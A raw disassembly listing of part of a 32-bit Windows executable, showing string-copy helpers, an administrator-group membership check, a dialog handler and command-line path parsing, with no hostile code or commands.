  4015c0:	2e 64 61             	cs fs popa
  4015c3:	74 61                	je     0x401626
  4015c5:	00 00                	add    %al,(%eax)
  4015c7:	00 e0                	add    %ah,%al
  4015c9:	81 00 00 68 18 00    	addl   $0x186800,(%eax)
  4015cf:	00 2e                	add    %ch,(%esi)
  4015d1:	62 73 73             	bound  %esi,0x73(%ebx)
  4015d4:	00 00                	add    %al,(%eax)
  4015d6:	00 00                	add    %al,(%eax)
  4015d8:	00 a0 00 00 88 02    	add    %ah,0x2880000(%eax)
  4015de:	00 00                	add    %al,(%eax)
  4015e0:	2e 69 64 61 74 61 24 	imul   $0x352461,%cs:0x74(%ecx,%eiz,2),%esp
  4015e7:	35 00 
  4015e9:	00 00                	add    %al,(%eax)
  4015eb:	00 88 a2 00 00 04    	add    %cl,0x40000a2(%eax)
  4015f1:	00 00                	add    %al,(%eax)
  4015f3:	00 2e                	add    %ch,(%esi)
  4015f5:	30 30                	xor    %dh,(%eax)
  4015f7:	63 66 67             	arpl   %esp,0x67(%esi)
  4015fa:	00 00                	add    %al,(%eax)
  4015fc:	8c a2 00 00 a0 00    	mov    %fs,0xa00000(%edx)
  401602:	00 00                	add    %al,(%eax)
  401604:	2e 69 64 61 74 61 24 	imul   $0x322461,%cs:0x74(%ecx,%eiz,2),%esp
  40160b:	32 00 
  40160d:	00 00                	add    %al,(%eax)
  40160f:	00 2c a3             	add    %ch,(%ebx,%eiz,4)
  401612:	00 00                	add    %al,(%eax)
  401614:	14 00                	adc    $0x0,%al
  401616:	00 00                	add    %al,(%eax)
  401618:	2e 69 64 61 74 61 24 	imul   $0x332461,%cs:0x74(%ecx,%eiz,2),%esp
  40161f:	33 00 
  401621:	00 00                	add    %al,(%eax)
  401623:	00 40 a3             	add    %al,-0x5d(%eax)
  401626:	00 00                	add    %al,(%eax)
  401628:	88 02                	mov    %al,(%edx)
  40162a:	00 00                	add    %al,(%eax)
  40162c:	2e 69 64 61 74 61 24 	imul   $0x342461,%cs:0x74(%ecx,%eiz,2),%esp
  401633:	34 00 
  401635:	00 00                	add    %al,(%eax)
  401637:	00 c8                	add    %cl,%al
  401639:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40163a:	00 00                	add    %al,(%eax)
  40163c:	8a 0a                	mov    (%edx),%cl
  40163e:	00 00                	add    %al,(%eax)
  401640:	2e 69 64 61 74 61 24 	imul   $0x362461,%cs:0x74(%ecx,%eiz,2),%esp
  401647:	36 00 
  401649:	00 00                	add    %al,(%eax)
  40164b:	00 00                	add    %al,(%eax)
  40164d:	c0 00 00             	rolb   $0x0,(%eax)
  401650:	10 04 00             	adc    %al,(%eax,%eax,1)
  401653:	00 2e                	add    %ch,(%esi)
  401655:	72 73                	jb     0x4016ca
  401657:	72 63                	jb     0x4016bc
  401659:	24 30                	and    $0x30,%al
  40165b:	31 00                	xor    %eax,(%eax)
  40165d:	00 00                	add    %al,(%eax)
  40165f:	00 10                	add    %dl,(%eax)
  401661:	c4 00                	les    (%eax),%eax
  401663:	00 a0 89 01 00 2e    	add    %ah,0x2e000189(%eax)
  401669:	72 73                	jb     0x4016de
  40166b:	72 63                	jb     0x4016d0
  40166d:	24 30                	and    $0x30,%al
  40166f:	32 00                	xor    (%eax),%al
	...
  40167d:	00 00                	add    %al,(%eax)
  40167f:	00 8b ff 55 8b ec    	add    %cl,-0x1374aa01(%ebx)
  401685:	33 c0                	xor    %eax,%eax
  401687:	85 d2                	test   %edx,%edx
  401689:	74 08                	je     0x401693
  40168b:	81 fa ff ff ff 7f    	cmp    $0x7fffffff,%edx
  401691:	76 05                	jbe    0x401698
  401693:	b8 57 00 07 80       	mov    $0x80070057,%eax
  401698:	85 c0                	test   %eax,%eax
  40169a:	78 0c                	js     0x4016a8
  40169c:	51                   	push   %ecx
  40169d:	ff 75 08             	push   0x8(%ebp)
  4016a0:	51                   	push   %ecx
  4016a1:	e8 db 00 00 00       	call   0x401781
  4016a6:	eb 07                	jmp    0x4016af
  4016a8:	85 d2                	test   %edx,%edx
  4016aa:	74 03                	je     0x4016af
  4016ac:	c6 01 00             	movb   $0x0,(%ecx)
  4016af:	5d                   	pop    %ebp
  4016b0:	c2 04 00             	ret    $0x4
  4016b3:	8b ff                	mov    %edi,%edi
  4016b5:	55                   	push   %ebp
  4016b6:	8b ec                	mov    %esp,%ebp
  4016b8:	53                   	push   %ebx
  4016b9:	56                   	push   %esi
  4016ba:	57                   	push   %edi
  4016bb:	33 ff                	xor    %edi,%edi
  4016bd:	bb 57 00 07 80       	mov    $0x80070057,%ebx
  4016c2:	8b f7                	mov    %edi,%esi
  4016c4:	85 d2                	test   %edx,%edx
  4016c6:	74 08                	je     0x4016d0
  4016c8:	81 fa ff ff ff 7f    	cmp    $0x7fffffff,%edx
  4016ce:	76 02                	jbe    0x4016d2
  4016d0:	8b f3                	mov    %ebx,%esi
  4016d2:	85 f6                	test   %esi,%esi
  4016d4:	78 3f                	js     0x401715
  4016d6:	8b f2                	mov    %edx,%esi
  4016d8:	8b c1                	mov    %ecx,%eax
  4016da:	85 d2                	test   %edx,%edx
  4016dc:	74 0b                	je     0x4016e9
  4016de:	80 38 00             	cmpb   $0x0,(%eax)
  4016e1:	74 06                	je     0x4016e9
  4016e3:	40                   	inc    %eax
  4016e4:	83 ee 01             	sub    $0x1,%esi
  4016e7:	75 f5                	jne    0x4016de
  4016e9:	8b fe                	mov    %esi,%edi
  4016eb:	8b c2                	mov    %edx,%eax
  4016ed:	f7 de                	neg    %esi
  4016ef:	1b f6                	sbb    %esi,%esi
  4016f1:	2b c7                	sub    %edi,%eax
  4016f3:	81 e6 a9 ff f8 7f    	and    $0x7ff8ffa9,%esi
  4016f9:	03 f3                	add    %ebx,%esi
  4016fb:	f7 df                	neg    %edi
  4016fd:	1b ff                	sbb    %edi,%edi
  4016ff:	23 f8                	and    %eax,%edi
  401701:	85 f6                	test   %esi,%esi
  401703:	78 10                	js     0x401715
  401705:	51                   	push   %ecx
  401706:	ff 75 08             	push   0x8(%ebp)
  401709:	2b d7                	sub    %edi,%edx
  40170b:	51                   	push   %ecx
  40170c:	03 cf                	add    %edi,%ecx
  40170e:	e8 6e 00 00 00       	call   0x401781
  401713:	8b f0                	mov    %eax,%esi
  401715:	5f                   	pop    %edi
  401716:	8b c6                	mov    %esi,%eax
  401718:	5e                   	pop    %esi
  401719:	5b                   	pop    %ebx
  40171a:	5d                   	pop    %ebp
  40171b:	c2 04 00             	ret    $0x4
  40171e:	8b ff                	mov    %edi,%edi
  401720:	55                   	push   %ebp
  401721:	8b ec                	mov    %esp,%ebp
  401723:	8b 45 0c             	mov    0xc(%ebp),%eax
  401726:	56                   	push   %esi
  401727:	33 f6                	xor    %esi,%esi
  401729:	85 c0                	test   %eax,%eax
  40172b:	74 07                	je     0x401734
  40172d:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  401732:	76 05                	jbe    0x401739
  401734:	be 57 00 07 80       	mov    $0x80070057,%esi
  401739:	85 f6                	test   %esi,%esi
  40173b:	78 35                	js     0x401772
  40173d:	53                   	push   %ebx
  40173e:	8b 5d 08             	mov    0x8(%ebp),%ebx
  401741:	33 f6                	xor    %esi,%esi
  401743:	57                   	push   %edi
  401744:	8d 78 ff             	lea    -0x1(%eax),%edi
  401747:	8d 45 14             	lea    0x14(%ebp),%eax
  40174a:	50                   	push   %eax
  40174b:	ff 75 10             	push   0x10(%ebp)
  40174e:	57                   	push   %edi
  40174f:	53                   	push   %ebx
  401750:	ff 15 7c a2 40 00    	call   *0x40a27c
  401756:	83 c4 10             	add    $0x10,%esp
  401759:	85 c0                	test   %eax,%eax
  40175b:	78 08                	js     0x401765
  40175d:	3b c7                	cmp    %edi,%eax
  40175f:	77 04                	ja     0x401765
  401761:	75 0b                	jne    0x40176e
  401763:	eb 05                	jmp    0x40176a
  401765:	be 7a 00 07 80       	mov    $0x8007007a,%esi
  40176a:	c6 04 1f 00          	movb   $0x0,(%edi,%ebx,1)
  40176e:	5f                   	pop    %edi
  40176f:	5b                   	pop    %ebx
  401770:	eb 0a                	jmp    0x40177c
  401772:	85 c0                	test   %eax,%eax
  401774:	74 06                	je     0x40177c
  401776:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401779:	c6 01 00             	movb   $0x0,(%ecx)
  40177c:	8b c6                	mov    %esi,%eax
  40177e:	5e                   	pop    %esi
  40177f:	5d                   	pop    %ebp
  401780:	c3                   	ret
  401781:	8b ff                	mov    %edi,%edi
  401783:	55                   	push   %ebp
  401784:	8b ec                	mov    %esp,%ebp
  401786:	85 d2                	test   %edx,%edx
  401788:	74 26                	je     0x4017b0
  40178a:	8b 45 0c             	mov    0xc(%ebp),%eax
  40178d:	53                   	push   %ebx
  40178e:	56                   	push   %esi
  40178f:	be fe ff ff 7f       	mov    $0x7ffffffe,%esi
  401794:	2b c1                	sub    %ecx,%eax
  401796:	85 f6                	test   %esi,%esi
  401798:	74 10                	je     0x4017aa
  40179a:	8a 1c 08             	mov    (%eax,%ecx,1),%bl
  40179d:	84 db                	test   %bl,%bl
  40179f:	74 09                	je     0x4017aa
  4017a1:	88 19                	mov    %bl,(%ecx)
  4017a3:	41                   	inc    %ecx
  4017a4:	4e                   	dec    %esi
  4017a5:	83 ea 01             	sub    $0x1,%edx
  4017a8:	75 ec                	jne    0x401796
  4017aa:	5e                   	pop    %esi
  4017ab:	5b                   	pop    %ebx
  4017ac:	85 d2                	test   %edx,%edx
  4017ae:	75 01                	jne    0x4017b1
  4017b0:	49                   	dec    %ecx
  4017b1:	f7 da                	neg    %edx
  4017b3:	c6 01 00             	movb   $0x0,(%ecx)
  4017b6:	1b d2                	sbb    %edx,%edx
  4017b8:	81 e2 86 ff f8 7f    	and    $0x7ff8ff86,%edx
  4017be:	8d 82 7a 00 07 80    	lea    -0x7ff8ff86(%edx),%eax
  4017c4:	5d                   	pop    %ebp
  4017c5:	c2 0c 00             	ret    $0xc
  4017c8:	8b ff                	mov    %edi,%edi
  4017ca:	55                   	push   %ebp
  4017cb:	8b ec                	mov    %esp,%ebp
  4017cd:	39 4d 08             	cmp    %ecx,0x8(%ebp)
  4017d0:	72 16                	jb     0x4017e8
  4017d2:	8b 45 08             	mov    0x8(%ebp),%eax
  4017d5:	ba 00 04 00 00       	mov    $0x400,%edx
  4017da:	2b c1                	sub    %ecx,%eax
  4017dc:	3b c2                	cmp    %edx,%eax
  4017de:	77 08                	ja     0x4017e8
  4017e0:	2b 4d 08             	sub    0x8(%ebp),%ecx
  4017e3:	8d 04 0a             	lea    (%edx,%ecx,1),%eax
  4017e6:	eb 02                	jmp    0x4017ea
  4017e8:	33 c0                	xor    %eax,%eax
  4017ea:	5d                   	pop    %ebp
  4017eb:	c2 04 00             	ret    $0x4
  4017ee:	8b ff                	mov    %edi,%edi
  4017f0:	55                   	push   %ebp
  4017f1:	8b ec                	mov    %esp,%ebp
  4017f3:	83 ec 18             	sub    $0x18,%esp
  4017f6:	a1 04 80 40 00       	mov    0x408004,%eax
  4017fb:	33 c5                	xor    %ebp,%eax
  4017fd:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401800:	53                   	push   %ebx
  401801:	56                   	push   %esi
  401802:	57                   	push   %edi
  401803:	33 c0                	xor    %eax,%eax
  401805:	66 c7 45 f8 00 05    	movw   $0x500,-0x8(%ebp)
  40180b:	8b f1                	mov    %ecx,%esi
  40180d:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401810:	68 44 11 40 00       	push   $0x401144
  401815:	89 75 e8             	mov    %esi,-0x18(%ebp)
  401818:	8b d8                	mov    %eax,%ebx
  40181a:	ff 15 78 a0 40 00    	call   *0x40a078
  401820:	8b f8                	mov    %eax,%edi
  401822:	85 ff                	test   %edi,%edi
  401824:	74 6a                	je     0x401890
  401826:	68 54 11 40 00       	push   $0x401154
  40182b:	57                   	push   %edi
  40182c:	ff 15 9c a0 40 00    	call   *0x40a09c
  401832:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401835:	85 c0                	test   %eax,%eax
  401837:	74 50                	je     0x401889
  401839:	33 c9                	xor    %ecx,%ecx
  40183b:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40183e:	50                   	push   %eax
  40183f:	51                   	push   %ecx
  401840:	51                   	push   %ecx
  401841:	51                   	push   %ecx
  401842:	51                   	push   %ecx
  401843:	51                   	push   %ecx
  401844:	51                   	push   %ecx
  401845:	68 20 02 00 00       	push   $0x220
  40184a:	6a 20                	push   $0x20
  40184c:	6a 02                	push   $0x2
  40184e:	8d 45 f4             	lea    -0xc(%ebp),%eax
  401851:	89 0e                	mov    %ecx,(%esi)
  401853:	50                   	push   %eax
  401854:	43                   	inc    %ebx
  401855:	ff 15 24 a0 40 00    	call   *0x40a024
  40185b:	85 c0                	test   %eax,%eax
  40185d:	74 2a                	je     0x401889
  40185f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401862:	8b f4                	mov    %esp,%esi
  401864:	ff 75 e8             	push   -0x18(%ebp)
  401867:	ff 75 ec             	push   -0x14(%ebp)
  40186a:	6a 00                	push   $0x0
  40186c:	ff 15 88 a2 40 00    	call   *0x40a288
  401872:	ff 55 f0             	call   *-0x10(%ebp)
  401875:	3b f4                	cmp    %esp,%esi
  401877:	74 07                	je     0x401880
  401879:	b9 04 00 00 00       	mov    $0x4,%ecx
  40187e:	cd 29                	int    $0x29
  401880:	ff 75 ec             	push   -0x14(%ebp)
  401883:	ff 15 10 a0 40 00    	call   *0x40a010
  401889:	57                   	push   %edi
  40188a:	ff 15 ac a0 40 00    	call   *0x40a0ac
  401890:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401893:	8b c3                	mov    %ebx,%eax
  401895:	5f                   	pop    %edi
  401896:	5e                   	pop    %esi
  401897:	33 cd                	xor    %ebp,%ecx
  401899:	5b                   	pop    %ebx
  40189a:	e8 41 54 00 00       	call   0x406ce0
  40189f:	8b e5                	mov    %ebp,%esp
  4018a1:	5d                   	pop    %ebp
  4018a2:	c3                   	ret
  4018a3:	8b ff                	mov    %edi,%edi
  4018a5:	55                   	push   %ebp
  4018a6:	8b ec                	mov    %esp,%ebp
  4018a8:	83 ec 1c             	sub    $0x1c,%esp
  4018ab:	a1 04 80 40 00       	mov    0x408004,%eax
  4018b0:	33 c5                	xor    %ebp,%eax
  4018b2:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4018b5:	a1 28 81 40 00       	mov    0x408128,%eax
  4018ba:	53                   	push   %ebx
  4018bb:	57                   	push   %edi
  4018bc:	6a 02                	push   $0x2
  4018be:	33 db                	xor    %ebx,%ebx
  4018c0:	66 c7 45 f8 00 05    	movw   $0x500,-0x8(%ebp)
  4018c6:	5f                   	pop    %edi
  4018c7:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  4018ca:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  4018cd:	3b c7                	cmp    %edi,%eax
  4018cf:	0f 85 f4 00 00 00    	jne    0x4019c9
  4018d5:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4018d8:	e8 11 ff ff ff       	call   0x4017ee
  4018dd:	85 c0                	test   %eax,%eax
  4018df:	0f 85 d3 00 00 00    	jne    0x4019b8
  4018e5:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4018e8:	50                   	push   %eax
  4018e9:	6a 08                	push   $0x8
  4018eb:	ff 15 90 a1 40 00    	call   *0x40a190
  4018f1:	50                   	push   %eax
  4018f2:	ff 15 14 a0 40 00    	call   *0x40a014
  4018f8:	85 c0                	test   %eax,%eax
  4018fa:	0f 84 c9 00 00 00    	je     0x4019c9
  401900:	8d 45 ec             	lea    -0x14(%ebp),%eax
  401903:	50                   	push   %eax
  401904:	53                   	push   %ebx
  401905:	53                   	push   %ebx
  401906:	57                   	push   %edi
  401907:	ff 75 e8             	push   -0x18(%ebp)
  40190a:	ff 15 00 a0 40 00    	call   *0x40a000
  401910:	85 c0                	test   %eax,%eax
  401912:	0f 85 92 00 00 00    	jne    0x4019aa
  401918:	ff 15 6c a0 40 00    	call   *0x40a06c
  40191e:	83 f8 7a             	cmp    $0x7a,%eax
  401921:	0f 85 83 00 00 00    	jne    0x4019aa
  401927:	56                   	push   %esi
  401928:	ff 75 ec             	push   -0x14(%ebp)
  40192b:	53                   	push   %ebx
  40192c:	ff 15 50 a1 40 00    	call   *0x40a150
  401932:	8b f0                	mov    %eax,%esi
  401934:	85 f6                	test   %esi,%esi
  401936:	74 71                	je     0x4019a9
  401938:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40193b:	50                   	push   %eax
  40193c:	ff 75 ec             	push   -0x14(%ebp)
  40193f:	56                   	push   %esi
  401940:	57                   	push   %edi
  401941:	ff 75 e8             	push   -0x18(%ebp)
  401944:	ff 15 00 a0 40 00    	call   *0x40a000
  40194a:	85 c0                	test   %eax,%eax
  40194c:	74 54                	je     0x4019a2
  40194e:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401951:	50                   	push   %eax
  401952:	53                   	push   %ebx
  401953:	53                   	push   %ebx
  401954:	53                   	push   %ebx
  401955:	53                   	push   %ebx
  401956:	53                   	push   %ebx
  401957:	53                   	push   %ebx
  401958:	68 20 02 00 00       	push   $0x220
  40195d:	6a 20                	push   $0x20
  40195f:	57                   	push   %edi
  401960:	8d 45 f4             	lea    -0xc(%ebp),%eax
  401963:	50                   	push   %eax
  401964:	ff 15 24 a0 40 00    	call   *0x40a024
  40196a:	85 c0                	test   %eax,%eax
  40196c:	74 34                	je     0x4019a2
  40196e:	39 1e                	cmp    %ebx,(%esi)
  401970:	76 27                	jbe    0x401999
  401972:	8d 7e 04             	lea    0x4(%esi),%edi
  401975:	ff 75 e4             	push   -0x1c(%ebp)
  401978:	ff 37                	push   (%edi)
  40197a:	ff 15 2c a0 40 00    	call   *0x40a02c
  401980:	85 c0                	test   %eax,%eax
  401982:	75 0a                	jne    0x40198e
  401984:	43                   	inc    %ebx
  401985:	83 c7 08             	add    $0x8,%edi
  401988:	3b 1e                	cmp    (%esi),%ebx
  40198a:	72 e9                	jb     0x401975
  40198c:	eb 0b                	jmp    0x401999
  40198e:	33 c0                	xor    %eax,%eax
  401990:	40                   	inc    %eax
  401991:	a3 28 81 40 00       	mov    %eax,0x408128
  401996:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401999:	ff 75 e4             	push   -0x1c(%ebp)
  40199c:	ff 15 10 a0 40 00    	call   *0x40a010
  4019a2:	56                   	push   %esi
  4019a3:	ff 15 a4 a0 40 00    	call   *0x40a0a4
  4019a9:	5e                   	pop    %esi
  4019aa:	ff 75 e8             	push   -0x18(%ebp)
  4019ad:	ff 15 88 a0 40 00    	call   *0x40a088
  4019b3:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4019b6:	eb 11                	jmp    0x4019c9
  4019b8:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4019bb:	85 c0                	test   %eax,%eax
  4019bd:	74 0a                	je     0x4019c9
  4019bf:	c7 05 28 81 40 00 01 	movl   $0x1,0x408128
  4019c6:	00 00 00 
  4019c9:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4019cc:	5f                   	pop    %edi
  4019cd:	33 cd                	xor    %ebp,%ecx
  4019cf:	5b                   	pop    %ebx
  4019d0:	e8 0b 53 00 00       	call   0x406ce0
  4019d5:	8b e5                	mov    %ebp,%esp
  4019d7:	5d                   	pop    %ebp
  4019d8:	c3                   	ret
  4019d9:	cc                   	int3
  4019da:	cc                   	int3
  4019db:	cc                   	int3
  4019dc:	cc                   	int3
  4019dd:	cc                   	int3
  4019de:	cc                   	int3
  4019df:	cc                   	int3
  4019e0:	8b ff                	mov    %edi,%edi
  4019e2:	55                   	push   %ebp
  4019e3:	8b ec                	mov    %esp,%ebp
  4019e5:	81 ec 04 02 00 00    	sub    $0x204,%esp
  4019eb:	a1 04 80 40 00       	mov    0x408004,%eax
  4019f0:	33 c5                	xor    %ebp,%eax
  4019f2:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4019f5:	8b 45 0c             	mov    0xc(%ebp),%eax
  4019f8:	56                   	push   %esi
  4019f9:	8b 75 08             	mov    0x8(%ebp),%esi
  4019fc:	2d 10 01 00 00       	sub    $0x110,%eax
  401a01:	74 21                	je     0x401a24
  401a03:	83 e8 01             	sub    $0x1,%eax
  401a06:	75 18                	jne    0x401a20
  401a08:	8b 55 10             	mov    0x10(%ebp),%edx
  401a0b:	8d 8a c3 f7 ff ff    	lea    -0x83d(%edx),%ecx
  401a11:	83 f9 01             	cmp    $0x1,%ecx
  401a14:	77 0a                	ja     0x401a20
  401a16:	52                   	push   %edx
  401a17:	56                   	push   %esi
  401a18:	ff 15 e0 a1 40 00    	call   *0x40a1e0
  401a1e:	eb 50                	jmp    0x401a70
  401a20:	33 c0                	xor    %eax,%eax
  401a22:	eb 4f                	jmp    0x401a73
  401a24:	ff 15 cc a1 40 00    	call   *0x40a1cc
  401a2a:	8b d0                	mov    %eax,%edx
  401a2c:	8b ce                	mov    %esi,%ecx
  401a2e:	e8 9d 29 00 00       	call   0x4043d0
  401a33:	68 00 02 00 00       	push   $0x200
  401a38:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  401a3e:	c6 85 fc fd ff ff 00 	movb   $0x0,-0x204(%ebp)
  401a45:	50                   	push   %eax
  401a46:	ff 75 14             	push   0x14(%ebp)
  401a49:	ff 35 3c 9a 40 00    	push   0x409a3c
  401a4f:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  401a55:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  401a5b:	50                   	push   %eax
  401a5c:	68 3f 08 00 00       	push   $0x83f
  401a61:	56                   	push   %esi
  401a62:	ff 15 d4 a1 40 00    	call   *0x40a1d4
  401a68:	6a ff                	push   $0xffffffff
  401a6a:	ff 15 dc a1 40 00    	call   *0x40a1dc
  401a70:	33 c0                	xor    %eax,%eax
  401a72:	40                   	inc    %eax
  401a73:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401a76:	33 cd                	xor    %ebp,%ecx
  401a78:	5e                   	pop    %esi
  401a79:	e8 62 52 00 00       	call   0x406ce0
  401a7e:	8b e5                	mov    %ebp,%esp
  401a80:	5d                   	pop    %ebp
  401a81:	c2 10 00             	ret    $0x10
  401a84:	8b ff                	mov    %edi,%edi
  401a86:	55                   	push   %ebp
  401a87:	8b ec                	mov    %esp,%ebp
  401a89:	51                   	push   %ecx
  401a8a:	53                   	push   %ebx
  401a8b:	8b c1                	mov    %ecx,%eax
  401a8d:	8b da                	mov    %edx,%ebx
  401a8f:	56                   	push   %esi
  401a90:	57                   	push   %edi
  401a91:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401a94:	33 ff                	xor    %edi,%edi
  401a96:	8b 30                	mov    (%eax),%esi
  401a98:	eb 06                	jmp    0x401aa0
  401a9a:	80 3e 00             	cmpb   $0x0,(%esi)
  401a9d:	74 1b                	je     0x401aba
  401a9f:	46                   	inc    %esi
  401aa0:	66 0f be 16          	movsbw (%esi),%dx
  401aa4:	8b cb                	mov    %ebx,%ecx
  401aa6:	e8 d4 4b 00 00       	call   0x40667f
  401aab:	85 c0                	test   %eax,%eax
  401aad:	75 eb                	jne    0x401a9a
  401aaf:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401ab2:	66 0f be 16          	movsbw (%esi),%dx
  401ab6:	89 30                	mov    %esi,(%eax)
  401ab8:	eb 10                	jmp    0x401aca
  401aba:	33 c0                	xor    %eax,%eax
  401abc:	eb 23                	jmp    0x401ae1
  401abe:	80 3c 37 00          	cmpb   $0x0,(%edi,%esi,1)
  401ac2:	74 11                	je     0x401ad5
  401ac4:	47                   	inc    %edi
  401ac5:	66 0f be 14 37       	movsbw (%edi,%esi,1),%dx
  401aca:	8b cb                	mov    %ebx,%ecx
  401acc:	e8 ae 4b 00 00       	call   0x40667f
  401ad1:	85 c0                	test   %eax,%eax
  401ad3:	74 e9                	je     0x401abe
  401ad5:	8d 04 37             	lea    (%edi,%esi,1),%eax
  401ad8:	80 38 00             	cmpb   $0x0,(%eax)
  401adb:	74 04                	je     0x401ae1
  401add:	c6 00 00             	movb   $0x0,(%eax)
  401ae0:	40                   	inc    %eax
  401ae1:	5f                   	pop    %edi
  401ae2:	5e                   	pop    %esi
  401ae3:	5b                   	pop    %ebx
  401ae4:	8b e5                	mov    %ebp,%esp
  401ae6:	5d                   	pop    %ebp
  401ae7:	c3                   	ret
  401ae8:	8b ff                	mov    %edi,%edi
  401aea:	55                   	push   %ebp
  401aeb:	8b ec                	mov    %esp,%ebp
  401aed:	81 ec 18 06 00 00    	sub    $0x618,%esp
  401af3:	a1 04 80 40 00       	mov    0x408004,%eax
  401af8:	33 c5                	xor    %ebp,%eax
  401afa:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401afd:	8b 45 08             	mov    0x8(%ebp),%eax
  401b00:	ba 04 01 00 00       	mov    $0x104,%edx
  401b05:	53                   	push   %ebx
  401b06:	56                   	push   %esi
  401b07:	8b d9                	mov    %ecx,%ebx
  401b09:	89 85 e8 f9 ff ff    	mov    %eax,-0x618(%ebp)
  401b0f:	8b 45 0c             	mov    0xc(%ebp),%eax
  401b12:	8d 8d f4 fd ff ff    	lea    -0x20c(%ebp),%ecx
  401b18:	57                   	push   %edi
  401b19:	53                   	push   %ebx
  401b1a:	89 85 ec f9 ff ff    	mov    %eax,-0x614(%ebp)
  401b20:	e8 5b fb ff ff       	call   0x401680
  401b25:	80 bd f4 fd ff ff 22 	cmpb   $0x22,-0x20c(%ebp)
  401b2c:	75 0d                	jne    0x401b3b
  401b2e:	ba 6c 11 40 00       	mov    $0x40116c,%edx
  401b33:	8d 85 f5 fd ff ff    	lea    -0x20b(%ebp),%eax
  401b39:	eb 0b                	jmp    0x401b46
  401b3b:	ba 70 11 40 00       	mov    $0x401170,%edx
  401b40:	8d 85 f4 fd ff ff    	lea    -0x20c(%ebp),%eax
  401b46:	8d 8d f0 f9 ff ff    	lea    -0x610(%ebp),%ecx
  401b4c:	89 85 f0 f9 ff ff    	mov    %eax,-0x610(%ebp)
  401b52:	e8 2d ff ff ff       	call   0x401a84
  401b57:	8b b5 f0 f9 ff ff    	mov    -0x610(%ebp),%esi
  401b5d:	8b f8                	mov    %eax,%edi
  401b5f:	85 f6                	test   %esi,%esi
  401b61:	74 3c                	je     0x401b9f
  401b63:	8b ce                	mov    %esi,%ecx
  401b65:	8d 51 01             	lea    0x1(%ecx),%edx
  401b68:	8a 01                	mov    (%ecx),%al
  401b6a:	41                   	inc    %ecx
  401b6b:	84 c0                	test   %al,%al
  401b6d:	75 f9                	jne    0x401b68
  401b6f:	2b ca                	sub    %edx,%ecx
  401b71:	83 f9 03             	cmp    $0x3,%ecx
  401b74:	72 29                	jb     0x401b9f
  401b76:	8a 46 01             	mov    0x1(%esi),%al
  401b79:	3c 3a                	cmp    $0x3a,%al
  401b7b:	75 06                	jne    0x401b83
  401b7d:	80 7e 02 5c          	cmpb   $0x5c,0x2(%esi)
  401b81:	74 09                	je     0x401b8c
  401b83:	80 3e 5c             	cmpb   $0x5c,(%esi)
  401b86:	75 17                	jne    0x401b9f
  401b88:	3c 5c                	cmp    $0x5c,%al
  401b8a:	75 13                	jne    0x401b9f
  401b8c:	56                   	push   %esi
  401b8d:	ba 04 01 00 00       	mov    $0x104,%edx
  401b92:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  401b98:	e8 e3 fa ff ff       	call   0x401680
  401b9d:	eb 28                	jmp    0x401bc7
  401b9f:	51                   	push   %ecx
  401ba0:	68 e4 91 40 00       	push   $0x4091e4
  401ba5:	51                   	push   %ecx
  401ba6:	ba 04 01 00 00       	mov    $0x104,%edx
  401bab:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  401bb1:	e8 cb fb ff ff       	call   0x401781
  401bb6:	56                   	push   %esi
  401bb7:	ba 04 01 00 00       	mov    $0x104,%edx
  401bbc:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  401bc2:	e8 c3 49 00 00       	call   0x40658a
  401bc7:	6a 2e                	push   $0x2e
  401bc9:	5a                   	pop    %edx
  401bca:	8b ce                	mov    %esi,%ecx
  401bcc:	e8 f7 4a 00 00       	call   0x4066c8
  401bd1:	85 c0                	test   %eax,%eax
  401bd3:	0f 84 9a 01 00 00    	je     0x401d73
  401bd9:	6a ff                	push   $0xffffffff
  401bdb:	68 74 11 40 00       	push   $0x401174
  401be0:	6a ff                	push   $0xffffffff
  401be2:	50                   	push   %eax
  401be3:	6a 01                	push   $0x1
  401be5:	6a 7f                	push   $0x7f
  401be7:	ff 15 68 a0 40 00    	call   *0x40a068
  401bed:	48                   	dec    %eax
  401bee:	83 e8 01             	sub    $0x1,%eax
  401bf1:	0f 85 7c 01 00 00    	jne    0x401d73
  401bf7:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  401bfd:	50                   	push   %eax
  401bfe:	ff 15 70 a0 40 00    	call   *0x40a070
  401c04:	83 f8 ff             	cmp    $0xffffffff,%eax
  401c07:	0f 84 46 01 00 00    	je     0x401d53
  401c0d:	c1 e8 04             	shr    $0x4,%eax
  401c10:	f7 d0                	not    %eax
  401c12:	83 e0 01             	and    $0x1,%eax
  401c15:	0f 84 38 01 00 00    	je     0x401d53
  401c1b:	ba 7c 11 40 00       	mov    $0x40117c,%edx
  401c20:	89 bd f0 f9 ff ff    	mov    %edi,-0x610(%ebp)
  401c26:	8d 8d f0 f9 ff ff    	lea    -0x610(%ebp),%ecx
  401c2c:	e8 53 fe ff ff       	call   0x401a84
  401c31:	85 c0                	test   %eax,%eax
  401c33:	74 1b                	je     0x401c50
  401c35:	80 38 00             	cmpb   $0x0,(%eax)
